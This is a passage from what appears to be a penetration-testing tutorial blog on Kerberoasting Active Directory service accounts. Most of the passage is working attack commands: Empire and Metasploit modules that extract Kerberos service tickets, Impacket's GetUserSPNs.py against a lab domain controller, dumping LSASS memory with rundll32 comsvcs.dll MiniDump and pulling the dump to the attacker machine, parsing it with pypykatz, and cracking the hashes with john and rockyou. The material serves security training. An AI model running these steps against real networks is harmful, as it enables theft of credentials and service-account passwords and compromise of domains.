+<p><img decoding="async" src="https://1.bp.blogspot.com/-gz8xvqZsWMg/XrHWToD8thI/AAAAAAAAj3M/lcVghMrgfuI9eHFUEXJ87BsfZkbTUWBFgCLcBGAsYHQ/s1600/27.png"/></p>
+<p><span style="color: #000000;">Finally, download the kirbi file on your local machine to convert it into the crackable format.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jDY1gzg-j3g/XrHWT5F8q0I/AAAAAAAAj3Q/sMs1zfWRUEsChGr7_1vaHDOQhvK5dMbjwCLcBGAsYHQ/s1600/28.png"/></p>
+<p><span style="color: #000000;"><strong>Step 3: </strong>Convert the Kirbi to Hash &amp; Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, I renamed the obtain file name as “2-40a5000…..kirbi” into “raj.kirbi” and again convert local.kirbi into john crackable format with the help of <strong>kirbi2john.py</strong> (possible at /usr/share/john/) named as “localhash”; then use john for brute force as done above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv "40a5000.....kirbi" "local.kirbi"
+/usr/share/john/kirbi2john.py local.kirbi &gt; localhash
+john -–wordlist=/usr/share/wordlists/rockyou.txt localhash</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-g31PfX1gmks/XrHWUeY0u1I/AAAAAAAAj3U/fO2P9kCm508hOYP1IeXc383r41FZR7rfQCLcBGAsYHQ/s1600/29.png"/></p>
+<h5><strong><span style="color: #000000;">Method 2: PowerShell Empire</span></strong></h5>
+<p><span style="color: #000000;"><strong>Step 1:</strong> SPN Discovery use setspn follow above method (Optional in this module)</span></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Extract &amp; Dump TGS_ticket &amp; Obtain Hash</span></p>
+<p><span style="color: #000000;">Then, once you have empire agent, execute the below module which will extract and dumb .kirbi  format file for TGS ticket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule credential/mimikatz/extract_tickets
+execute</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-T95nyhwHXCg/XrHWVGoJQtI/AAAAAAAAj3c/53ANLBcoeoMIAlQY0aGEFL5QQUQh0fn4gCLcBGAsYHQ/s1600/30.png"/></p>
+<p><span style="color: #000000;"><strong>Step 3:</strong> Convert kirbi to hash &amp; then Brute force</span></p>
+<p><span style="color: #000000;">You can also tgscrack.py which a dedicated python script that converts kirbi format into the crackable format and then brute force the hashes to extract the password. Download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/leechristensen/tgscrack">here</a> </strong></span>then run the following commands</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv [kirbi_file] [new.kirbi]
+python extractServiceTicketParts.py [path_of_new.kirbi_file] &gt; ignitehash
+go run tgscrack.go -hashfile ignitehash -wordlist /usr/share/wordlists/rockyou.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-U7h44nRA5-A/XrHWS4lkt6I/AAAAAAAAj3E/9ULvWTXc6icJhBjaXGqO4nr0JdUB3N8YQCLcBGAsYHQ/s1600/25.png"/></p>
+<h4><span style="color: #800000;">PART 4: NEW Kerberoasting Procedure on Remote System</span></h4>
+<h5><span style="color: #000000;"><strong>Method 1: PowerShell Empire</strong></span></h5>
+<p><span style="color: #000000;"><strong>Step 1</strong>: SPN Discover, Dump TGS, obtain HASH (All-in-one)</span></p>
+<p><span style="color: #000000;">Once you have Empire/agent then load invoke_kerberoast module, it is a cool module as it discovered the SPN, extracts the ticket, and dump the service hash from inside the TGS cipher.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule credentials/invoke_kerberoast
+execute</pre>
+<p><span style="color: #000000;">As you can see, it has dumped the service hash within a second.</span></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, repeat the same procedure to brute force the hashes.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-2JJZ3TzJEYg/XrHWWP_jZmI/AAAAAAAAj3k/96Vk0Zq3IKcR2CHk1wvVStWvXMZ8hqwNQCLcBGAsYHQ/s1600/32.png"/></p>
+<h5><span style="color: #000000;"><strong>Method 2:  Metasploit</strong></span></h5>
+<p><span style="color: #000000;"><strong>Step 1:</strong> SPN Discover, Dump TGS, obtain HASH (All-in-one)</span></p>
+<p><span style="color: #000000;">If you are Metasploit interface lover then after obtaining a meterpreter session you can load the PowerShell and upload kerberoast.ps1 script, download it from <a style="color: #000000;" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">here</a>, it discovered the SPN, extract the TGS ticket then dump the service hash from inside the TGS cipher.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell_import /root/powershell/Invoke-kerberoast.ps1
+powershell_execute Invoke-Kerberoast</pre>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, repeat the same procedure to brute force the hashes.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-96FrPtWpG88/XrHWWA6FkEI/AAAAAAAAj3o/_7-ASyNJuzYPILG-AqKCs97Fzaw1ZCLFQCLcBGAsYHQ/s1600/33.png"/></p>
+<h5><span style="color: #000000;"><strong>Method 3: Impacket</strong></span></h5>
+<p><span style="color: #000000;"><strong>Step 1:</strong> SPN Discover, Dump TGS, obtain HASH (All-in-one)</span></p>
+<p><span style="color: #000000;">Use <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/SecureAuthCorp/impacket">Impacket</a></span> </strong>inbuilt module “GetUSerSPNs.py”, it is a python script that it discovers SPN, extract TGS and dump service Hash, this can be done with the help of the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika</pre>
+<p><span style="color: #000000;">Then, it will dump the service hash and with the help of the dictionary, you can brute force it for extracting service passwords.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-YNCPvvx3NRE/XrHWWkUBCoI/AAAAAAAAj3s/RDf6-7bdgoMO22PAqaRMWpnrYfyhGnQ7gCLcBGAsYHQ/s1600/34.png"/></p>
+<p><span style="color: #000000;"><strong>Step 2: </strong>Brute Force Hash</span></p>
+<p><span style="color: #000000;">Again, repeat the same procedure to brute force the hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john –wordlist=/usr/share/wordlists/rockyou.txt hashes</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-d3BTKZn9h2U/XrHWXSJWNNI/AAAAAAAAj3w/cqi93oA26ywVOaoZA9qWk67p1GtDYbrGwCLcBGAsYHQ/s1600/35.png"/></p>
+<h5><strong><span style="color: #000000;">Pypykatz</span></strong></h5>
+<p><span style="color: #000000;">In order to conduct kerberoasting attack, we need to import DMP file in our local machine (Kali Linux) through Client machine and to do this execute the following command through meterpreter session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">load powershell
+powershell_shell
+Get-Process Lsass
+cd C:\Windows\System32
+.\rundll32.exe comsvcs.dll, MiniDump 628 C:\lsass.DMP full</pre>
+<p><span style="color: #000000;">Why we need Lsass.Dmp file?</span></p>
+<p><span style="color: #000000;">Because of LSASS.DMP stores the TGT &amp; TGS ticket in the kirbi format for some period of time and using this DMP file we can obtain the following:</span></p>
+<ul>
+<li><span style="color: #000000;">NTLM HASH of User</span></li>
+<li><span style="color: #000000;">KRB5_TGT ticket</span></li>
+<li><span style="color: #000000;">KRB5_TGS ticket</span></li>
+<li><span style="color: #000000;">NTLM HASH for Service</span></li>
+</ul>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-sJdWaLAckc4/XuZopxcBaxI/AAAAAAAAkzA/8y0v3z5pbbIrwlj0Apv91PDUDoQtmRp9QCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">Then, once you have dumped the lsass.dmp, download it on your local machine for extracting kirbi files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">download lsass.DMP /root/Desktop/</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-9BGi2Lpomb0/XuZoqLcOQYI/AAAAAAAAkzI/_Mq4jFL8Lgsv2-30dm0rSeNSGRK6KRG2ACLcBGAsYHQ/s1600/2.png"/></p>
+<p>Download and install <strong><a href="https://github.com/skelsec/pypykatz">pypykatz</a></strong> for extracting stored Kerberos tickets in Kirbi format from inside the lsass.DMP file by executing the following commands</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /root/kerb
+pypykatz lsa -k /root/kerb minidump /root/Desktop/lsass.DMP</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-_DSP-41z5HE/XuZoqHWgDQI/AAAAAAAAkzE/x5y7wXaVWUsiHEb-awIH_tZW8tDK9SqyQCLcBGAsYHQ/s1600/3.png"/></p>
+<p><span style="color: #000000;">As you can observe we have obtained all Kerberos ticket in kirbi format as well as the NTLM HASH for user Yashika.</span></p>
+<p><span style="color: #000000;">As we said with the help of stored KRB5_TGS, we can extract the NTLM hashes for Service Server.</span></p>
+<p><span style="color: #000000;">Now as you can see in the highlight image we’ve outlined the KRB5_TGS for SQL Server in kirbi format and converted it to john crackable format with the help of kirbi2john.py (possible at /usr/ share/john/) called “TGS hash;” then use john for brute force password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/share/john/kirbi2john.py &lt;KRB5_TGS kirbi&gt;  &gt; &lt;Output file name&gt;
+john --wordlist=/usr/share/wordlistst/rockyou.txt TGS_hash</pre>
+<p><span style="color: #000000;">Booom!!!! We found the password for SQL service server.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Qe155aJZd5c/XuZosodR3SI/AAAAAAAAkzY/q5c6EpPqZmYUnhMhBjDjCWBriSmqxmp1wCLcBGAsYHQ/s1600/7.png"/></p>
+<h4><span style="color: #000000;">Reference</span></h4>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">Microsoft Service Principal Names</a></strong></span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.tarlogic.com/en/blog/how-kerberos-works/">https://www.tarlogic.com/en/blog/how-kerberos-works/</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
